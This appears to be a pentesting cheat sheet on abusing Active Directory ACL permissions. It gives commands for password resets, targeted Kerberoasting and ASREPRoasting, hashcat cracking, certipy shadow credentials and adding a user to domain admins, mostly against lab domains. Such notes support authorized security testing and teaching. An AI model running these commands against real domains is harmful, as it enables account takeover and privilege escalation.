# ACLs Abuse

> An **ACL is an ordered list of ACEs (access control entry)** that define the protections that apply to an object and its properties. Each ACE identifies a security principal and specifies a set of access rights that are allowed, denied, or audited for that security principal. An object’s security descriptor can contain two ACLs:
>
> * A DACL that identifies the users and groups that are allowed or denied access
> * A SACL that controls how access is audited
>
> When a user tries to access a file, the Windows system runs an AccessCheck and compares the security descriptor with the users access token and evaluates if the user is granted access and what kind of access depending on the ACEs set.

{% embed url="https://lootsec.io/abusing-active-directory-acl/" %}

## DACL

> A DACL, Discretionary Access Control List, will contain details that help identify which user or group has access to an object and who is denied access.
>
> Only the access control lists that define the degree of access for users and groups are called DACLs.

### **GenericAll**

Full rights to the object (add users to a group or reset user's password)

#### **on User**

1. **Change the password** of the user:

```powershell
net user <username> <password> /domain

# from linux
rpcclient -U KnownUsername 10.10.10.192
setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

2. **Targeted Kerberoasting**: You could make the user kerberoastable setting an SPN on the account, kerberoast it and attempt to crack offline:

```powershell
# Set SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# Get Hash
.\Rubeus.exe kerberoast /user:<username> /nowrap
# Clean SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# You can also use the tool https://github.com/ShutdownRepo/targetedKerberoast 
# to get hashes of one or all the users
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```

4. **Targeted ASREPRoasting**: You could make the user ASREPRoastable by disabling preauthentication and then ASREProast it:

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

### **GenericWrite**

Update object's attributes (i.e logon script)

#### on User

This could be abuse with 3 different technics :

* shadowCredentials (windows server 2016 or +)
* **targetKerberoasting** (password should be weak enough to be cracked)
* logonScript (this need a user connection and to be honest it never worked or unless with a script already inside sysvol)

```bash
# targetKerberoast
targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p pasdebraspasdechocolat --request-user joffrey.baratheon

# crack hash
hashcat -m 13100 -a 0 joffrey.hash rockyou.txt --force

# shadow credentials
certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'pasdebraspasdechocolat' -account 'joffrey.baratheon'
```

#### **on Group**

Claire has GenericWrite over backups-admins group

```powershell
# add claire to the group !
net group backup-admins claire /add
```

### **WriteOwner**

Change object owner to attacker controlled user take over the object

#### **on User**

Tom has WriteOwner on Claire

```powershell
### Create powershell credential and change credentials. 
### NOTE!! IN A REAL PENTEST YOU WOULD ENABLE REVERSIBLE ENCRYPTION OR MAKE USER KERBEROSTABLE OR SOMETHING ELSE AND NOT CHANGE THE PASSWORD IN A PRODUCTION ENVIRONMENT
$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
```

### **WriteDACL**

Modify object's ACEs and give attacker full control right over the object

#### **on User**

You can add new ACLs

```powershell
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
```

### **ForceChangePassword**

Ability to change user's password

```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}

# same with powerview
Set-DomainUserPassword -Identity delegate -Verbose

# from linux
rpcclient -U KnownUsername 10.10.10.192
setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

### **Self**

Another privilege that enables the attacker adding themselves to a group.

```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## SACL

> SACLs are used for establishing system-wide security policies for actions such as logging or auditing resource access. The SACL attached to a system, directory, or file object specifies
>
> * Which security principals (users, groups, computers) should be audited when accessing the object
> * Which access events should be audited for these principals
> * Whether a Success or Failure attribute is generated for an access event, depending on the permissions granted in the DACL for the object
